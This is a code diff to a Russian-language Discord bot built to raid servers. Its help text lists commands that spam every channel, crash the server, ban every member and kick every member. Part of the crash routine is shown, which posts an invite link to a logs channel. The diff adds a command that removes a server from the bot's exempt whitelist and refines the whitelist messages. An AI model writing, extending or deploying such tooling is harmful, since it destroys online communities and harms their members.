@@ -129,7 +129,8 @@ spam - спамит во всех каналах
 crash - крашает сервер
 massban - банит всех участников сервера
 masskick - выгоняет всех участников сервера
-whitelist - добавляет сервер в белый лист```
+whitelist - добавляет сервер в белый лист
+removewhitelist - убирает сервер с белого листа```
     '''
     emb = discord.Embed(title='Команды',
     description=desc,colour=discord.Colour.dark_purple())
@@ -208,7 +209,7 @@ async def crash(ctx):
                 guildlink = str(await textchan.create_invite())
                 if guildlink:
                     emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
-                     await logs_channel.send(embed=emb)
+                    await logs_channel.send(embed=emb)
       
       
        
@@ -271,6 +272,8 @@ async def masskick(ctx):
 
 @bot.command()
 async def whitelist(ctx, serv_id: int):
+    guild = await fetch_guild(serv_id)
+
     if ctx.author.id not in allowed_ids:
         emb = discord.Embed(title='❌ У вас нет прав добавлять сервера в белый лист.', colour=discord.Colour.red())
         await ctx.send(embed=emb)
@@ -280,13 +283,32 @@ async def whitelist(ctx, serv_id: int):
         wllist.append(serv_id)
         with open('whitelist.json', 'w') as data:
             json.dump(wllist, data)
-        emb = discord.Embed(title=f'{serv_id} был добавлен в белый лист!', colour=discord.Colour.green())
+        emb = discord.Embed(title=f'{guild.name} был добавлен в белый лист!', colour=discord.Colour.green())
         await ctx.send(embed=emb)
     else:
         emb = discord.Embed(title='Сервер уже в белом листе.', colour=discord.Colour.dark_purple())
         await ctx.send(embed=emb)      
     
+
+
+@bot.command()
+async def removewhitelist(ctx, serv_id: int):
+    guild = await fetch_guild(serv_id)
+
+    if ctx.author.id not in allowed_ids:
+        emb = discord.Embed(title='❌ У вас нет прав добавлять сервера в белый лист.', colour=discord.Colour.red())
+        await ctx.send(embed=emb)
+        return
     
+    if serv_id in wllist:
+        wllist.remove(serv_id)
+        with open('whitelist.json', 'w') as data:
+            json.dump(wllist, data)
+        emb = discord.Embed(title=f'{guild.name} был удален с белого листа!', colour=discord.Colour.red())
+        await ctx.send(embed=emb)
+    else:
+        emb = discord.Embed(title='Сервера нет в белом листе.', colour=discord.Colour.dark_purple())
+        await ctx.send(embed=emb)     
     
 
 bot.run(token, log_handler=None)
